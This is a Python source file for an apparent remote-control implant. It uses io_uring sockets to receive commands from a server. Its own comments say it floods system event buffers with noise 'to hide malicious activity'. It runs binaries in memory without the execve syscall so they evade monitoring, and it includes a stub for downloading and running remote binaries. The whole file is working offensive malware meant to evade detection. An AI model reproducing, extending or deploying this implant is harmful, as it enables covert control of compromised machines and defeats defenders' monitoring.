#!/usr/bin/env python

import socket
import os
import sys
from multiprocessing.pool import ThreadPool
import shutil
from liburing import io_uring, io_uring_cqes, io_uring_queue_init, io_uring_queue_exit, \
        iovec, io_uring_get_sqe, io_uring_wait_cqe, io_uring_submit, io_uring_cqe_seen, \
        trap_error, io_uring_prep_socket, io_uring_prep_write, io_uring_prep_read, \
        io_uring_prep_close, io_uring_prep_connect, AF_INET, SOCK_STREAM, sockaddr_in

from ulexecve import ELFExecutor, MemFdExecutor

# Default noise activiy
noise_cmd = "touch /tmp/kek"
bufsize = 4096

def main():
    server_ip = '127.0.0.1'
    server_port = 12345
    server_seen = False
    noise = False
    cpu_cores = os.cpu_count()
    pool = ThreadPool(processes=cpu_cores)
    message = "ready"
    ring = io_uring()
    cqes = io_uring_cqes()

    io_uring_queue_init(8, ring, 0)
    agent_socket = socket(ring, cqes)
    addr, addrlen = sockaddr_in(server_ip, server_port)
    connect(ring, cqes, agent_socket, addr, addrlen)

    while True:
        write(ring, cqes, agent_socket, message.encode('utf-8'))
        message = "ready"
        response = read(ring, cqes, agent_socket, bufsize)
        cmd = response.decode('utf-8').rstrip()
        if len(cmd) < 1:
            continue

        print("Received from server:", cmd)
        if not server_seen:
            server_seen = True
        if cmd == "exit":
            break
        else:
            tokenized = cmd.split(None)
            print(tokenized)

            # Fill the event buffer to hide malicious activity
            if tokenized[0] == "noise":
                if tokenized[1] == "on":
                    if noise:
                        message = "Noise is already on"
                    else:
                        noise = True
                        for x in range(cpu_cores):
                            print("launching worker")
                            pool.apply(make_noise)
                else:
                    pool.shutdown(wait=False)
                    noise = False
                continue

            # Execute binaries without execve system call
            elif tokenized[0] == "ulexec" or tokenized[0] == "memfd":
                message = userland_exec(tokenized)

            # Download binaries from the internet, store in memory and execute
            elif tokenized[0] == "dl":
                # For now, this action is performed with standard TCP functions
                # like connect() and so on. This will most likely get detected.
                yn = input("This action is bad OPSEC. Continue? [Y/N]: ")
                if yn != "Y":
                    continue # TODO

    # Close the connection
    close(ring, cqes, agent_socket)

def make_noise():
    while True:
        os.system(noise_cmd)

def userland_exec(tokenized):
    binpath = shutil.which(tokenized[1])
    if binpath is None:
        message = "No such binary on host"
        return
    print("requested binary path: " + binpath)
    binfd = open(binpath, "rb")
    executor = None
    if tokenized[0] == "ulexec":
        executor = ELFExecutor(binfd, binpath)
    else:
        executor = MemFdExecutor(binfd, binpath)
    binfd.close()

    # To capture stdout of ulexec'd binary running in fork
    pipe_in, pipe_out = os.pipe()

    pid = os.fork()
    if pid == -1:
        # Could not fork for watchdog process
        sys.exit(1)
    elif pid == 0:
        os.close(pipe_in)
        os.dup2(pipe_out, 1)
        executor.execute(tokenized[2:], False, False, None)
    else:
        wait = os.wait()
        if wait[1] == 0:
            os.close(pipe_out)
            message = ""
            while True:
                output = os.read(pipe_in, bufsize).decode()
                if len(output) == 0:
                   break
                message += output
        else:
            message = "ERR"
    return message

def socket(ring, cqes):
    sqe = io_uring_get_sqe(ring)
    io_uring_prep_socket(sqe, AF_INET, SOCK_STREAM, 0, 0)
    return submit_and_wait(ring, cqes)

def connect(ring, cqes, fd, sockaddr, socklen):
    sqe = io_uring_get_sqe(ring)
    io_uring_prep_connect(sqe, fd, sockaddr, socklen)
    return submit_and_wait(ring, cqes)

def write(ring, cqes, fd, data, offset=0):
    buffer = bytearray(data)
    iov = iovec(buffer)
    sqe = io_uring_get_sqe(ring)
    io_uring_prep_write(sqe, fd, iov[0].iov_base, iov[0].iov_len, offset)
    return submit_and_wait(ring, cqes)

def read(ring, cqes, fd, length, offset=0):
    buffer = bytearray(length)
    iov = iovec(buffer)
    sqe = io_uring_get_sqe(ring)
    io_uring_prep_read(sqe, fd, iov[0].iov_base, iov[0].iov_len, offset)
    read_length = submit_and_wait(ring, cqes)
    return buffer[:read_length]

def close(ring, cqes, fd):
    sqe = io_uring_get_sqe(ring)
    io_uring_prep_close(sqe, fd)                  
    submit_and_wait(ring, cqes)

def submit_and_wait(ring, cqes):
    io_uring_submit(ring)
    io_uring_wait_cqe(ring, cqes)
    cqe = cqes[0]
    result = trap_error(cqe.res)
    io_uring_cqe_seen(ring, cqe)
    return result

if __name__ == "__main__":
    main()
